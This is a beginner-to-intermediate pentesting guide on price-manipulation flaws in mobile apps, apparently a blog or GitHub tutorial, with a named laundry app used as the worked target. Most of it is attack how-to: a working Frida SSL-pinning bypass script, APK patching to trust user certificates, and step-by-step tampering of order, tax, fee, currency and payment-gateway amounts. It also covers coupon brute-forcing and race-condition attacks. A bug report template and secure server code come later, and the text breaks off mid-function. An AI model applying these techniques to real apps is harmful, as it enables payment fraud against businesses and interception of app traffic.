# 💰 Complete Guide: Price Manipulation Vulnerability in Mobile Apps

### A Detailed Pentesting Guide for Mobile App Security Testers

> **Author:** Vishal Rao | **Last Updated:** February 2026  
> **Difficulty:** Beginner → Intermediate  
> **Example App:** Haier Wash (Laundry Service App)  
> **⚠️ Disclaimer:** This guide is for **authorized security testing and educational purposes only**. Always obtain proper authorization before testing any application. Unauthorized testing is illegal under the Computer Fraud and Abuse Act (CFAA) and similar laws worldwide.

---

## 📑 Table of Contents

1. [What is Price Manipulation?](#1-what-is-price-manipulation)
2. [Why It Matters — Real-World Impact](#2-why-it-matters--real-world-impact)
3. [Prerequisites & Lab Setup](#3-prerequisites--lab-setup)
4. [Setting Up Burp Suite for Mobile Traffic Interception](#4-setting-up-burp-suite-for-mobile-traffic-interception)
5. [Configuring Android Device / Emulator with Burp Proxy](#5-configuring-android-device--emulator-with-burp-proxy)
6. [SSL Pinning Bypass Techniques](#6-ssl-pinning-bypass-techniques)
7. [Reconnaissance — Understanding the App Flow](#7-reconnaissance--understanding-the-app-flow)
8. [Identifying Price Parameters in API Requests](#8-identifying-price-parameters-in-api-requests)
9. [Exploiting Price Manipulation — Step-by-Step](#9-exploiting-price-manipulation--step-by-step)
10. [Variations & Advanced Techniques](#10-variations--advanced-techniques)
11. [Writing a Professional Bug Report](#11-writing-a-professional-bug-report)
12. [Remediation Recommendations](#12-remediation-recommendations)
13. [CVSS Scoring for Price Manipulation](#13-cvss-scoring-for-price-manipulation)
14. [Checklist — Quick Reference](#14-checklist--quick-reference)
15. [Tools Reference](#15-tools-reference)

---

## 1. What is Price Manipulation?

Price manipulation (also called **Price Tampering** or **Business Logic Flaw**) is a vulnerability where an attacker can **modify the price, quantity, discount, or total amount** of a product/service in transit between the mobile app (client) and the backend server.

### How It Works (Simplified)

```
┌──────────────┐         ┌──────────────┐         ┌──────────────┐
│  Mobile App  │ ──────► │  Burp Suite  │ ──────► │   Backend    │
│  (Client)    │         │  (Proxy)     │         │   Server     │
│              │         │              │         │              │
│ Price: ₹500  │         │ Price: ₹1 ✏️  │         │ Accepts ₹1?  │
└──────────────┘         └──────────────┘         └──────────────┘
```

The vulnerability exists when:
- The **client (app) sends the price** to the server
- The **server trusts client-side data** without re-validating against its own database
- There is **no server-side price verification** before processing the order

### Types of Price Manipulation

| Type | Description | Example |
|------|-------------|---------|
| **Direct Price Change** | Modify the price field in the request | `price=500` → `price=1` |
| **Quantity Manipulation** | Change quantity but pay for less | `qty=1` (but receive 10) |
| **Discount Abuse** | Apply invalid/expired discount codes | `discount=99.99` |
| **Currency Confusion** | Switch currency code to a weaker one | `currency=USD` → `currency=VND` |
| **Coupon Stacking** | Apply multiple coupons that shouldn't stack | Apply 50% + 50% |
| **Negative Value** | Use negative prices for refund logic abuse | `price=-500` |
| **Race Condition** | Submit payment before price update propagates | Rapid concurrent requests |
| **Tax Removal** | Remove or zero out tax fields | `tax=0` |
| **Shipping Fee Bypass** | Remove or zero out delivery charges | `delivery_fee=0` |
| **Rounding Exploit** | Exploit floating point in bulk orders | `price=0.001` × 1000 |

---

## 2. Why It Matters — Real-World Impact

### Financial Impact
- **Direct Revenue Loss:** Company loses money on every manipulated order
- **Scalable Attack:** Can be automated with scripts to place thousands of manipulated orders
- **Refund Fraud:** Combined with refund requests = double loss

### Bug Bounty Context
- **Severity:** Usually rated **High** to **Critical** (P1/P2)
- **CVSS Score:** Typically **7.5 – 9.1** depending on impact
- **Bounty Range:** $500 – $10,000+ depending on the program
- **OWASP Classification:** A04:2021 — Insecure Design / A08:2021 — Software and Data Integrity Failures

### Real-World Examples

| Company | Impact | Bounty |
|---------|--------|--------|
| Starbucks | Modified gift card top-up amounts | $4,000 |
| Shopify Stores | Changed product prices at checkout | $5,000 |
| Uber | Modified fare amount in ride requests | $6,500 |
| Food delivery apps | Changed item prices to ₹0 | $1,000–$3,000 |
| E-commerce platforms | Purchased items at manipulated prices | $2,000–$8,000 |

---

## 3. Prerequisites & Lab Setup

### Hardware / Software Required

| Component | Requirement | Purpose |
|-----------|-------------|---------|
| **Computer** | Any OS (macOS/Windows/Linux) | Running Burp Suite |
| **Burp Suite** | Community (free) or Pro ($449/yr) | HTTP/S proxy & interceptor |
| **Android Device** | Physical phone (rooted preferred) | Running target app |
| **OR Android Emulator** | Genymotion / Android Studio AVD | Virtual testing device |
| **Frida** | Latest version via pip | SSL pinning bypass |
| **objection** | Latest version via pip | Runtime mobile exploration |
| **ADB** | Android SDK Platform Tools | Device communication |
| **Haier Wash APK** | From Play Store or APKPure | Target app for testing |
| **WiFi Network** | Same network for phone + laptop | Proxy routing |

### Install Required Tools

```bash
# Install Frida (for SSL pinning bypass)
pip3 install frida-tools objection

# Install ADB (macOS)
brew install android-platform-tools

# Verify installations
frida --version
objection version
adb version
```

### Download Burp Suite

1. Go to: https://portswigger.net/burp/communitydownload
2. Download **Burp Suite Community Edition** for your OS
3. Install and launch it
4. Select **Temporary Project** → **Use Burp Defaults** → **Start Burp**

---

## 4. Setting Up Burp Suite for Mobile Traffic Interception

This is the **most critical step** — getting Burp to intercept mobile app traffic.

### Step 4.1 — Find Your Computer's Local IP

```bash
# macOS
ifconfig | grep "inet " | grep -v 127.0.0.1

# Windows
ipconfig | findstr IPv4

# Linux
hostname -I
```

**Note your IP** (e.g., `192.168.1.105`) — you'll need this for the phone's proxy config.

### Step 4.2 — Configure Burp Proxy Listener

1. Open Burp Suite
2. Go to **Proxy** → **Options** (in Burp Community) or **Proxy** → **Proxy Settings** (Burp 2024+)
3. Under **Proxy Listeners**, click **Add**
4. Configure:

```
┌─────────────────────────────────────────┐
│       Add Proxy Listener                │
├─────────────────────────────────────────┤
│ Bind to port:    8080                   │
│ Bind to address: ○ Loopback only        │
│                  ● All interfaces   ✅   │
│                  ○ Specific address      │
└─────────────────────────────────────────┘
```

> **Important:** Select **"All interfaces"** so your phone can connect to it.

5. Click **OK** → Confirm the listener is **Running** (green checkbox)

### Step 4.3 — Export Burp CA Certificate

Your phone needs to trust Burp's CA certificate to intercept HTTPS traffic.

1. Open browser on your **computer**: http://127.0.0.1:8080
2. Click **"CA Certificate"** in the top right
3. This downloads `cacert.der`
4. Rename it to `cacert.cer` (important for Android)

**OR via command line:**
```bash
curl -o cacert.der http://127.0.0.1:8080/cert
mv cacert.der burp_ca.cer
```

---

## 5. Configuring Android Device / Emulator with Burp Proxy

### Option A: Physical Android Device (Recommended)

#### Step 5.1 — Connect to Same WiFi Network
Both your laptop and phone **must be on the same WiFi network**.

#### Step 5.2 — Set Proxy on Phone

1. **Settings** → **WiFi** → Long press your connected network → **Modify Network**
2. Expand **Advanced Options**
3. Set **Proxy** to **Manual**
4. Configure:

```
┌────────────────────────────────────┐
│  Proxy Settings                    │
├────────────────────────────────────┤
│  Proxy hostname: 192.168.1.105    │  ← Your computer's IP
│  Proxy port:     8080             │  ← Burp listener port
│  Bypass proxy:   (leave empty)    │
└────────────────────────────────────┘
```

5. Save the settings

#### Step 5.3 — Install Burp CA Certificate on Phone

**Method 1: Direct Download (Android < 14)**
1. Open phone browser → Go to `http://192.168.1.105:8080`
2. Click **"CA Certificate"**
3. It downloads `cacert.der`
4. Go to **Settings** → **Security** → **Install from storage**
5. Select the downloaded certificate
6. Name it `Burp` → Select **VPN and apps** → Install

**Method 2: Via ADB (Android 14+ / Rooted Device)**
```bash
# Push cert to device
adb push burp_ca.cer /sdcard/

# For rooted devices — install as SYSTEM cert (persists across apps):
adb root
adb remount

# Convert to proper format
openssl x509 -inform DER -in burp_ca.cer -out burp_ca.pem
HASH=$(openssl x509 -inform PEM -subject_hash_old -in burp_ca.pem | head -1)
cp burp_ca.pem ${HASH}.0

# Push to system cert store
adb push ${HASH}.0 /system/etc/security/cacerts/
adb shell chmod 644 /system/etc/security/cacerts/${HASH}.0
adb reboot
```

**Method 3: Via Magisk Module (Rooted, No remount needed)**
```bash
# Use "MagiskTrustUserCerts" module
# 1. Install user cert normally (Method 1)
# 2. Install MagiskTrustUserCerts module in Magisk
# 3. Reboot — user certs get moved to system trust store
```

#### Step 5.4 — Verify Connection

1. Open phone browser
2. Visit `https://google.com`
3. Check Burp Suite → **Proxy** → **HTTP History**
4. You should see Google's requests appearing ✅

```
If you see requests in Burp History → PROXY IS WORKING ✅
If browser shows "No Internet" → Check IP/Port, firewall, same WiFi
If browser shows "Certificate Error" → CA cert not installed properly
```

### Option B: Android Emulator (Genymotion)

```bash
# 1. Download Genymotion: https://www.genymotion.com/
# 2. Create a device (Samsung Galaxy S23, API 33)
# 3. Set proxy in emulator settings:
#    Settings → WiFi → WiredSSID → Proxy → Manual
#    Host: 10.0.3.2 (Genymotion's host IP)
#    Port: 8080
```

### Option C: Android Studio Emulator

```bash
# Start emulator with proxy
emulator -avd Pixel_6_API_33 -http-proxy 127.0.0.1:8080

# Install cert
adb push burp_ca.cer /sdcard/
# Then install via Settings → Security → Install from storage
```

---

## 6. SSL Pinning Bypass Techniques

Most modern apps (including Haier Wash) implement **SSL/Certificate Pinning**, which prevents Burp from intercepting HTTPS traffic even with the CA cert installed. You'll see **TLS handshake errors** in Burp.

### What is SSL Pinning?

```
WITHOUT PINNING:                      WITH PINNING:
App → trusts ANY valid cert           App → trusts ONLY its specific cert
    → Burp cert = VALID ✅               → Burp cert = REJECTED ❌
    → Traffic visible                    → Traffic blocked
```

### Method 1: Frida + objection (Easiest — Recommended)

```bash
# Step 1: Find Frida server for your device architecture
adb shell getprop ro.product.cpu.abi
# Output: arm64-v8a

# Step 2: Download matching frida-server
# https://github.com/frida/frida/releases
# Example: frida-server-16.x.x-android-arm64.xz

# Step 3: Push frida-server to device
adb push frida-server /data/local/tmp/
adb shell chmod 755 /data/local/tmp/frida-server

# Step 4: Start frida-server on device (needs root)
adb shell su -c "/data/local/tmp/frida-server &"

# Step 5: Verify frida can see the device
frida-ls-devices
# Should show your device listed

# Step 6: Find the app's package name
adb shell pm list packages | grep -i haier
# Output: package:com.haier.wash (example)

# Step 7: Launch app with SSL pinning bypass via objection
objection -g com.haier.wash explore

# Inside objection console:
# objection> android sslpinning disable
# Output: [+] SSLPinning bypass applied ✅
```

### Method 2: Frida Script (Manual — More Control)

```bash
# Save this as ssl_bypass.js
```

```javascript
// ssl_bypass.js — Universal SSL Pinning Bypass
Java.perform(function () {
    console.log("[*] Starting SSL Pinning Bypass...");

    // Bypass TrustManagerFactory
    var TrustManagerFactory = Java.use('javax.net.ssl.TrustManagerFactory');
    var SSLContext = Java.use('javax.net.ssl.SSLContext');

    // OkHttp CertificatePinner bypass
    try {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload('java.lang.String', 'java.util.List')
            .implementation = function (hostname, peerCertificates) {
                console.log('[+] OkHttp3 SSL Pinning bypassed for: ' + hostname);
                return;
            };
    } catch (e) {
        console.log('[-] OkHttp3 not found, skipping...');
    }

    // TrustManager bypass
    var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
    var TrustManager = Java.registerClass({
        name: 'com.bypass.TrustManager',
        implements: [X509TrustManager],
        methods: {
            checkClientTrusted: function (chain, authType) { },
            checkServerTrusted: function (chain, authType) { },
            getAcceptedIssuers: function () { return []; }
        }
    });

    // Apply to SSLContext
    var TrustManagers = [TrustManager.$new()];
    var SSLContextInit = SSLContext.init.overload(
        '[Ljavax.net.ssl.KeyManager;',
        '[Ljavax.net.ssl.TrustManager;',
        'java.security.SecureRandom'
    );
    SSLContextInit.implementation = function (keyManager, trustManager, secureRandom) {
        console.log('[+] SSLContext.init() bypassed');
        SSLContextInit.call(this, keyManager, TrustManagers, secureRandom);
    };

    console.log("[✅] SSL Pinning Bypass Active!");
});
```

```bash
# Run the bypass
frida -U -f com.haier.wash -l ssl_bypass.js --no-pause
```

### Method 3: APK Patching (No Root Required)

```bash
# Step 1: Decompile the APK
apktool d haier_wash.apk -o haier_wash_decompiled

# Step 2: Modify network_security_config.xml
# File: haier_wash_decompiled/res/xml/network_security_config.xml
```

```xml
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <base-config cleartextTrafficPermitted="true">
        <trust-anchors>
            <certificates src="system" />
            <certificates src="user" />  <!-- Trust user-installed certs -->
        </trust-anchors>
    </base-config>
</network-security-config>
```

```bash
# Step 3: Rebuild & sign
apktool b haier_wash_decompiled -o haier_wash_patched.apk

# Sign the APK
keytool -genkey -v -keystore my-key.keystore -alias mykey \
  -keyalg RSA -keysize 2048 -validity 10000

apksigner sign --ks my-key.keystore haier_wash_patched.apk

# Step 4: Install patched APK
adb install haier_wash_patched.apk
```

### Troubleshooting SSL Bypass

| Problem | Solution |
|---------|----------|
| Frida crashes on attach | Update frida-server to match frida-tools version |
| "Process not found" | Use `-f` flag to spawn instead of attach |
| Pinning still active | App may use custom pinning; try combining methods |
| "SELinux denied" | `adb shell setenforce 0` (temp disable) |
| App detects root | Use Magisk Hide / Shamiko module |
| App detects frida | Use `frida-server-name-randomizer` or Gadget |

---

## 7. Reconnaissance — Understanding the App Flow

Before hunting for price manipulation, you need to **map the entire purchase flow**.

### Step 7.1 — Install and Use the App Normally

1. Install **Haier Wash** from Play Store
2. Create an account / Login
3. **Walk through the ENTIRE order flow** while Burp captures traffic:

```
📱 App Flow (Haier Wash Example):
│
├── 1. Open App → Home Screen
│       └── API: GET /api/v1/services (loads service catalog)
│
├── 2. Select Service (e.g., "Wash & Fold")
│       └── API: GET /api/v1/services/{id}/pricing
│
├── 3. Select Items & Quantities
│       └── API: POST /api/v1/cart/add
│       └── Body: {"service_id": 101, "items": [{"id": 5, "qty": 2}]}
│
├── 4. Choose Pickup Address & Time
│       └── API: POST /api/v1/orders/schedule
│
├── 5. Apply Coupon / Promo Code
│       └── API: POST /api/v1/coupons/apply
│       └── Body: {"code": "FIRST50", "order_id": "ORD123"}
│
├── 6. Review Order Summary ← 🎯 KEY INTERCEPTION POINT
│       └── API: POST /api/v1/orders/summary
│       └── Response includes: price, tax, delivery_fee, total
│
├── 7. Proceed to Payment
│       └── API: POST /api/v1/orders/create
│       └── Body: {"total": 500, "payment_method": "upi"} ← 🎯 MODIFY THIS
│
├── 8. Payment Gateway Redirect
│       └── API: POST /api/v1/payments/initiate
│       └── Body: {"order_id": "ORD123", "amount": 500} ← 🎯 AND THIS
│
└── 9. Order Confirmation
        └── API: GET /api/v1/orders/ORD123/status
```

### Step 7.2 — Map API Endpoints in Burp

1. Go to **Proxy** → **HTTP History** in Burp
2. Filter by the app's domain (e.g., `api.haier.com` or `wash.haier.com`)
3. **Document every endpoint** that involves:
   - Prices
   - Amounts
   - Quantities
   - Discounts
   - Totals
   - Tax
   - Delivery/shipping fees

### Step 7.3 — Use Burp's Target Sitemap

1. Go to **Target** → **Site Map**
2. Find the app's API domain
3. Right-click → **Add to Scope**
4. Now go to **Proxy** → **Options** → Check **"Only intercept in-scope items"**

This filters out noise from analytics, ads, and other SDKs.

---

## 8. Identifying Price Parameters in API Requests

### What to Look For in Burp HTTP History

Open each request and look for price-related parameters in:

#### 📋 Request Body (POST/PUT)
```json
{
  "service_id": 101,
  "items": [
    {
      "item_id": 5,
      "item_name": "Shirt",
      "quantity": 2,
      "unit_price": 50,          // 🎯 TARGET
      "subtotal": 100            // 🎯 TARGET
    }
  ],
  "delivery_fee": 40,            // 🎯 TARGET
  "tax": 18,                     // 🎯 TARGET
  "discount": 0,                 // 🎯 TARGET
  "promo_code": "",
  "total_amount": 158,           // 🎯 TARGET
  "currency": "INR",             // 🎯 TARGET
  "payment_method": "upi"
}
```

#### 📋 URL Parameters (GET)
```
GET /api/v1/checkout?amount=158&currency=INR&service=wash_fold
```

#### 📋 Headers (Rare but possible)
```
X-Order-Amount: 158
X-Currency: INR
```

#### 📋 Hidden Fields / Encoded Data
```
# Base64 encoded order data
order_data=eyJ0b3RhbCI6MTU4LCJjdXJyZW5jeSI6IklOUiJ9

# Decoded:
{"total":158,"currency":"INR"}
```

### Burp Shortcut: Search Across All Requests

1. Go to **Proxy** → **HTTP History**
2. Press **Ctrl+F** (Cmd+F on Mac)
3. Search for: `price`, `amount`, `total`, `cost`, `fee`, `discount`, `qty`
4. This highlights every request/response containing these keywords

---

## 9. Exploiting Price Manipulation — Step-by-Step

### 🎯 Scenario: Haier Wash — Modify Laundry Order Price

#### Attack Flow

```
Normal Flow:
App → "Wash & Fold: ₹500" → Server processes ₹500 → Payment: ₹500 ✅

Attack Flow:
App → "Wash & Fold: ₹500" → Burp intercepts → Change to ₹1 → Server processes ₹1 → Payment: ₹1 💰
```

#### Step 9.1 — Enable Interception

1. In Burp → **Proxy** → **Intercept** → Turn **"Intercept is ON"** ✅
2. On your phone, open Haier Wash app
3. Select a service (e.g., Wash & Fold for 5 shirts)
4. Proceed to checkout

#### Step 9.2 — Intercept the Order Creation Request

In Burp, you'll see requests being intercepted. **Forward** (click Forward button) non-relevant requests until you see the **order creation** or **payment** request:

```http
POST /api/v1/orders/create HTTP/2
Host: api.haierwash.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
X-Device-ID: a1b2c3d4e5
User-Agent: HaierWash/3.2.1 (Android 14; Samsung SM-S911B)

{
  "user_id": "USR_98765",
  "service_type": "wash_and_fold",
  "items": [
    {
      "item_id": "SHIRT_001",
      "item_name": "Shirt",
      "quantity": 5,
      "unit_price": 50.00,
      "subtotal": 250.00
    }
  ],
  "pickup_address_id": "ADDR_123",
  "pickup_slot": "2026-02-28T10:00:00Z",
  "delivery_fee": 40.00,
  "gst_amount": 52.20,
  "discount_amount": 0,
  "coupon_code": "",
  "total_amount": 342.20,
  "currency": "INR",
  "payment_method": "razorpay_upi"
}
```

#### Step 9.3 — Modify the Price

**Right-click the intercepted request** → **"Send to Repeater"** (for safe testing first)

In **Repeater**, modify the values:

```http
POST /api/v1/orders/create HTTP/2
Host: api.haierwash.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...

{
  "user_id": "USR_98765",
  "service_type": "wash_and_fold",
  "items": [
    {
      "item_id": "SHIRT_001",
      "item_name": "Shirt",
      "quantity": 5,
      "unit_price": 1.00,           // ← Changed from 50.00 to 1.00
      "subtotal": 5.00              // ← Changed from 250.00 to 5.00
    }
  ],
  "pickup_address_id": "ADDR_123",
  "pickup_slot": "2026-02-28T10:00:00Z",
  "delivery_fee": 0,               // ← Changed from 40.00 to 0
  "gst_amount": 0.90,              // ← Changed from 52.20
  "discount_amount": 0,
  "coupon_code": "",
  "total_amount": 5.90,            // ← Changed from 342.20 to 5.90
  "currency": "INR",
  "payment_method": "razorpay_upi"
}
```

#### Step 9.4 — Send and Analyze Response

Click **"Send"** in Repeater and check the response:

**Vulnerable Response (Server accepted manipulated price):**
```json
{
  "status": "success",
  "order_id": "ORD_2026_00456",
  "message": "Order created successfully",
  "payment_details": {
    "amount": 5.90,                  // ← Server accepted ₹5.90!
    "currency": "INR",
    "payment_link": "https://razorpay.com/pay/..."
  }
}
```
**→ VULNERABLE ✅ — Server accepted the manipulated price!**

**Not Vulnerable Response (Server validates price):**
```json
{
  "status": "error",
  "code": "PRICE_MISMATCH",
  "message": "Price validation failed. Expected ₹342.20, received ₹5.90"
}
```
**→ NOT VULNERABLE ❌ — Server has proper validation**

#### Step 9.5 — Complete the Payment (Proof of Concept)

If the server accepted the manipulated price:

1. Go back to **Proxy** → **Intercept**
2. On the phone, the payment page should now show **₹5.90** instead of ₹342.20
3. **Take screenshots** at every step as evidence
4. Complete the payment of ₹5.90
5. Check if the order is confirmed for the **full service** (5 shirts wash & fold) at ₹5.90

> **⚠️ Important:** In a real bug bounty, you may want to **stop before actual payment** and use screenshots + Repeater evidence. If you do complete it, report immediately and offer to pay the difference.

---

## 10. Variations & Advanced Techniques

### 10.1 — Quantity Manipulation

```json
// Original
{"item_id": "SHIRT_001", "quantity": 5, "unit_price": 50, "subtotal": 250}

// Attack: Get 100 items for price of 1
{"item_id": "SHIRT_001", "quantity": 1, "unit_price": 50, "subtotal": 50}
// But the initial request already told server qty=5
// Server might fulfill 5 items but charge for 1
```

### 10.2 — Negative Price Attack

```json
// Original
{"total_amount": 342.20, "discount_amount": 0}

// Attack: Negative discount = money INTO your account?
{"total_amount": 342.20, "discount_amount": -500}
// OR
{"total_amount": -342.20}
```

### 10.3 — Currency Manipulation

```json
// Original (Indian Rupees)
{"total_amount": 342.20, "currency": "INR"}

// Attack: Change to weakest currency
{"total_amount": 342.20, "currency": "VND"}
// 342 VND ≈ ₹1.10 (Vietnamese Dong is ~1 INR = 300 VND)
```

### 10.4 — Coupon/Discount Abuse

```json
// Test 1: Apply expired coupon
POST /api/v1/coupons/apply
{"code": "WELCOME50", "order_id": "ORD_123"}

// Test 2: Apply coupon multiple times
POST /api/v1/coupons/apply
{"code": "FLAT100", "order_id": "ORD_123"}
POST /api/v1/coupons/apply  ← Send again
{"code": "FLAT100", "order_id": "ORD_123"}

// Test 3: Apply another user's referral code on your own order
{"code": "REF_ANOTHER_USER", "order_id": "ORD_123"}

// Test 4: Brute-force coupon codes
// Use Burp Intruder with wordlist of common codes:
// FIRST50, WELCOME, FLAT100, SAVE20, FREE, LAUNCH, etc.
```

### 10.5 — Race Condition (TOCTOU)

```bash
# Send 10 simultaneous payment requests with different amounts
# Some might slip through before server validates

# Using Burp Turbo Intruder:
# 1. Send request to Turbo Intruder
# 2. Use "race.py" template
# 3. Set concurrency to 10-20
# 4. All requests fire at same millisecond
```

### 10.6 — Payment Gateway Amount Mismatch

Sometimes the app sends the amount separately to the payment gateway:

```
App → Server: Create order (₹342.20) ✅
Server → Payment Gateway: Initiate payment (₹342.20)
App → Payment Gateway: Confirm payment

🎯 Intercept the payment gateway request:
POST https://api.razorpay.com/v1/orders
{"amount": 34220, "currency": "INR"}  ← amount in paise

Change to:
{"amount": 100, "currency": "INR"}    ← ₹1.00 in paise
```

### 10.7 — Delivery Fee Bypass

```json
// Original
{"delivery_fee": 40.00, "total": 342.20}

// Attack 1: Zero delivery fee
{"delivery_fee": 0, "total": 302.20}

// Attack 2: Negative delivery fee
{"delivery_fee": -100, "total": 202.20}
```

### 10.8 — Tax Manipulation

```json
// Original (18% GST)
{"subtotal": 290, "gst": 52.20, "total": 342.20}

// Attack: Remove tax
{"subtotal": 290, "gst": 0, "total": 290}
```

### 10.9 — Subscription Plan Downgrade-Price, Upgrade-Access

```json
// Premium plan: ₹999/month
// Basic plan: ₹99/month

// Attack: Request premium with basic price
POST /api/v1/subscription/create
{
  "plan_id": "PREMIUM_MONTHLY",      // Premium features
  "amount": 99                        // Basic price
}
```

### 10.10 — Modify Response (Client-Side Price Display)

Even if server validates, check if **response modification** works:

1. In Burp → **Proxy** → **Options** → **Match and Replace**
2. Add rule:
   - Type: **Response body**
   - Match: `"total":342.20`
   - Replace: `"total":1.00`
3. The app might **display** ₹1.00 and let you proceed to payment

---

## 11. Writing a Professional Bug Report

### Bug Report Template

---

**Title:** Price Manipulation in Order Checkout — Allows Placing Orders at Arbitrary Price

**Severity:** High / Critical (P1)

**Affected Application:** Haier Wash Mobile App (Android v3.2.1)

**Affected Endpoint:** `POST /api/v1/orders/create`

**Vulnerability Type:** Business Logic Flaw — Client-Side Price Trust (CWE-472: External Control of Assumed-Immutable Web Parameter)

---

#### Summary

The Haier Wash mobile application transmits pricing information (unit price, subtotal, delivery fee, tax, and total amount) as client-controlled parameters in the order creation API request. The backend server does not validate these values against its own price database before processing the order, allowing an attacker to place orders at arbitrary prices.

#### Impact

- **Financial Loss:** An attacker can order laundry services worth ₹342.20 for as low as ₹1, causing direct revenue loss
- **Scalability:** This attack can be automated to place unlimited orders at manipulated prices
- **Reputation Damage:** If exploited at scale, the company could suffer significant financial and operational damage

#### Environment

| Component | Details |
|-----------|---------|
| App Version | Haier Wash v3.2.1 (Android) |
| Device | Samsung Galaxy S24 Ultra (Android 14) |
| Proxy Tool | Burp Suite Professional v2024.12 |
| SSL Bypass | Frida 16.x + objection |
| Date Tested | 27 February 2026 |

#### Steps to Reproduce

1. Install Haier Wash app on an Android device configured to proxy through Burp Suite (see setup in Section 4-5)
2. Bypass SSL pinning using Frida/objection: `objection -g com.haier.wash explore` → `android sslpinning disable`
3. Log into the app and select "Wash & Fold" service
4. Add 5 shirts (total should be ₹250 + ₹40 delivery + ₹52.20 GST = ₹342.20)
5. Proceed to checkout — Burp intercepts the `POST /api/v1/orders/create` request
6. In Burp Repeater, modify the following fields:
   - `unit_price`: 50.00 → **1.00**
   - `subtotal`: 250.00 → **5.00**
   - `delivery_fee`: 40.00 → **0**
   - `gst_amount`: 52.20 → **0.90**
   - `total_amount`: 342.20 → **5.90**
7. Send the modified request
8. Server responds with `"status": "success"` and creates order at ₹5.90
9. Payment of ₹5.90 is processed for a service worth ₹342.20

#### Proof of Concept

**Original Request:**
```http
POST /api/v1/orders/create HTTP/2
Host: api.haierwash.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
Content-Type: application/json

{"total_amount": 342.20, "items": [{"unit_price": 50.00, "quantity": 5}]}
```

**Modified Request:**
```http
POST /api/v1/orders/create HTTP/2
Host: api.haierwash.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
Content-Type: application/json

{"total_amount": 5.90, "items": [{"unit_price": 1.00, "quantity": 5}]}
```

**Server Response (Vulnerable):**
```json
{"status": "success", "order_id": "ORD_2026_00456", "amount": 5.90}
```

#### Screenshots / Evidence

1. `screenshot_01_normal_checkout.png` — Normal checkout showing ₹342.20
2. `screenshot_02_burp_intercept.png` — Burp intercepting the request
3. `screenshot_03_modified_request.png` — Modified values in Repeater
4. `screenshot_04_success_response.png` — Server accepting ₹5.90
5. `screenshot_05_order_confirmed.png` — Order confirmation at ₹5.90
6. `video_poc.mp4` — Full video walkthrough (optional but recommended)

#### CVSS v3.1 Score

```
Attack Vector (AV):           Network (N)
Attack Complexity (AC):       Low (L)
Privileges Required (PR):     Low (L)      ← Needs authenticated account
User Interaction (UI):        None (N)
Scope (S):                    Unchanged (U)
Confidentiality Impact (C):   None (N)
Integrity Impact (I):         High (H)     ← Modifies financial data
Availability Impact (A):      None (N)

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N
CVSS Score: 6.5 (Medium) — 8.1 (High) depending on financial impact
```

#### Suggested Remediation

1. **Server-Side Price Validation:** Always fetch prices from the database on the server side; never trust client-submitted prices
2. **Price Integrity Check:** Implement a server-side calculation: `total = Σ(db_unit_price × quantity) + db_delivery_fee + calculated_tax`
3. **Signed Price Tokens:** Use HMAC-signed tokens for prices that the server can verify haven't been tampered with
4. **Rate Limiting:** Implement rate limits on order creation to prevent automated exploitation
5. **Anomaly Detection:** Flag orders where the submitted price differs from the expected calculated price
6. **Audit Logging:** Log all price discrepancies for investigation

---

## 12. Remediation Recommendations

### For Developers — How to Fix This

#### ❌ WRONG: Trusting Client Price

```python
# BAD CODE — Server trusts client price
@app.route('/api/v1/orders/create', methods=['POST'])
def create_order():
    data = request.json
    total = data['total_amount']     # ← Directly from client!
    
    order = Order(
        user_id=data['user_id'],
        total=total,                  # ← No validation!
        items=data['items']
    )
    db.session.add(order)
    db.session.commit()
    
    # Initiate payment with client-submitted amount
    payment = razorpay.create_order(amount=total)  # ← VULNERABLE
    return jsonify({"status": "success", "payment": payment})
```

#### ✅ CORRECT: Server-Side Price Calculation

```python
# GOOD CODE — Server calculates everything
@app.route('/api/v1/orders/create', methods=['POST'])
def create_order():
    data = request.json
    
    # Fetch REAL prices from database
    calculated_total = 0
    for item in data['items']:
        db_item = Item.query.get(item['item_id'])
        if not db_item:
            return jsonify({"error": "Invalid item"}), 400
        
        real_price = db_item.price                # ← From DATABASE
        quantity = item['quantity']
        
        # Validate quantity limits
        if quantity < 1 or quantity > 100:
            return jsonify({"error": "Invalid quantity"}), 400
        
        calculated_total += real_price * quantity
    
    # Calculate delivery fee from database
    delivery_fee = DeliveryFee.get_current()       # ← From DATABASE
    
    # Calculate tax
    gst = calculated_total * Decimal('0.18')       # ← Server calculated
    
    # Apply coupon (server-validated)
    discount = 0
    if data.get('coupon_code'):
        coupon = Coupon.validate(data['coupon_code'], data['user_id'])
        if coupon and coupon.is_valid():
            discount = coupon.calculate_discount(calculated_total)
    
    final_total = calculated_total + delivery_fee + gst - discount
    
    # Compare with client total (for logging/alerting)
    client_total = Decimal(str(data.get('total_amount', 0)))
    if abs(final_total - client_total) > Decimal('0.01'):
        # LOG ALERT — Possible manipulation attempt!
        logger.warning(f"Price mismatch! Client: {client_total}, Server: {final_total}")
        AuditLog.create(
            event="PRICE_MANIPULATION_ATTEMPT",
            user_id=data['user_id'],
            details=f"Client sent {client_total}, expected {final_total}"
        )
    
    # Use SERVER-CALCULATED price only
    order = Order(
        user_id=data['user_id'],
        total=final_total,             # ← SERVER calculated!
        items=data['items']
    )
    db.session.add(order)
    db.session.commit()
    
    # Payment with server-calculated amount
    payment = razorpay.create_order(amount=int(final_total * 100))
    return jsonify({"status": "success", "amount": float(final_total)})
```

#### Additional Security Measures

```python
# 1. HMAC-Signed Price Token
import hmac, hashlib, json, time

def generate_price_token(order_data, secret_key):
    """Generate signed token that client can't forge"""
    payload = {
        "items": order_data["items"],
        "total": str(order_data["total"]),
        "timestamp": int(time.time()),
        "nonce": os.urandom(16).hex()
    }
    message = json.dumps(payload, sort_keys=True).encode()
    signature = hmac.new(secret_key.encode(), message, hashlib.sha256).hexdigest()
    return {"payload": payload, "signature": signature}

def verify_price_token(token, secret_key):
    """Verify token hasn't been tampered with"""
    message = json.dumps(token["payload"], sort_keys=True).encode()
    expected_sig = hmac.new(secret_key.encode(), message, hashlib.sha256).hexdigest()
    
    if not hmac.compare_digest(expected_sig, token["signature"]):
        raise ValueError("Price token tampered!")
    
    # Check token age (5 min max)
